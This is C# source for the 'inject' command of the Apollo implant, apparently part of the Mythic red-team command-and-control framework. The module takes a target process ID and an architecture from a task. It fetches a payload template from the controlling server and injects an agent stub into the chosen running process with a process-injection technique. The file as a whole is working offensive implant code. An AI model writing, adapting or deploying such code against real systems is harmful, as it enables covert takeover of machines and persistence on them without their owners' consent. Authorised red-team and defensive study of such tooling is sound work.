#define COMMAND_NAME_UPPER

#if DEBUG
#undef INJECT
#define INJECT
#endif


#if INJECT
using Newtonsoft.Json;
using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using Mythic.Structs;
using Apollo.Jobs;
using Apollo.MessageInbox;
using Apollo.Tasks;
using Utils;
using System.Runtime.InteropServices;

namespace Apollo.CommandModules
{
    public struct InjectArguments
    {
        public string template;
        public int pid;
        public string arch;
    }

    class Inject
    {
        public static void Execute(Job job, Agent implant)
        {
            InjectArguments args = JsonConvert.DeserializeObject<InjectArguments>(job.Task.parameters);

            if (string.IsNullOrEmpty(args.template))
            {
                job.SetError("No template file passed to retrieve.");
                return;
            }

            if (args.pid < 0 || args.pid % 4 != 0)
            {
                job.SetError("Invalid PID given.");
                return;
            }

            if (args.arch != "x86" && args.arch != "x64")
            {
                job.SetError($"Invalid architecture passed: {args.arch}");
                return;
            }

            try
            {
                var tempProc = System.Diagnostics.Process.GetProcessById(args.pid);
            }
            catch (Exception ex)
            {
                job.SetError($"Could not find process with PID {args.pid}. Reason: {ex.Message}");
                return;
            }

            byte[] templateFile = implant.Profile.GetFile(job.Task.id, args.template, implant.Profile.ChunkSize);
            if (templateFile == null || templateFile.Length == 0)
            {
                job.SetError($"Unable to retrieve template file with ID: {args.template}");
                return;
            }

            var injectionType = Injection.InjectionTechnique.GetInjectionTechnique();
            var injectionHandler = (Injection.InjectionTechnique)Activator.CreateInstance(injectionType, new object[] { templateFile, (uint)args.pid});

            try
            {
                if (injectionHandler.Inject())
                {
                    job.SetComplete($"Injected agent into {args.pid}");
                } else
                {
                    job.SetError($"Failed to inject stub. Win32LastError: {Marshal.GetLastWin32Error()}");
                }
            } catch (Exception ex)
            {
                job.SetError($"Failed to inject stub. Reason: {ex.Message}");
            }
        }
    }
}
#endif